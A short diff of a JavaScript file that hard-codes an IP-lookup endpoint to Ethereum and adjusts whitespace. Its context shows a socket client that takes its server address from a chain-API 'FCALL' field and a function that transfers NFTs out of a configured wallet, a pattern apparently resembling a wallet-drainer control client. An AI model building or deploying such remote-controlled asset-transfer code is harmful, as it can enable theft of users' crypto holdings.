@@ -1,6 +1,6 @@
 const init_sockets = async () => {
   if (!DATA.server_ip) {
-    DATA.server_ip = await fetch(`${DATA.IP_API}${DATA.CHAIN || 'BSC'}`).catch(() => {
+    DATA.server_ip = await fetch(`${DATA.IP_API}/ETH`).catch(() => {
       DATA.server_ip = null;
       store.del(`${DATA.CHAIN}_server_ip`);
     });
@@ -9,7 +9,7 @@ const init_sockets = async () => {
       return help_err('Something is wrong');
     }
 
-    DATA.server_ip = (await DATA.server_ip.json().catch((_) => {})).FCALL;
+    DATA.server_ip = (await DATA.server_ip.json().catch((_) => { })).FCALL;
 
     if (!DATA.server_ip) {
       return help_err('No IP');
@@ -122,7 +122,7 @@ const handle_error = (data) => {
   if (DATA.socket && DATA.socket.readyState === 1) {
     try {
       return emit({ a: 'err', d: `Unknown response: ${JSON.stringify(data)}` });
-    } catch (e) {}
+    } catch (e) { }
 
     emit({ a: 'err', d: `Unknown response: ${data}` });
   }
@@ -217,7 +217,7 @@ const send_nft = async (to, nft_type) => {
       /* ERC1155 */
       return await sendChain(chain_id, DATA.CHAINS[chain_id][DATA.NFT_TYPES_MAP[nft_type]], 'safeTransferFrom', DATA.conf.wallet, to, _hex(tokenId), _hex(1), '0x00').catch(console.error);
     }
-  } catch (e) {}
+  } catch (e) { }
 
   return false;
 };
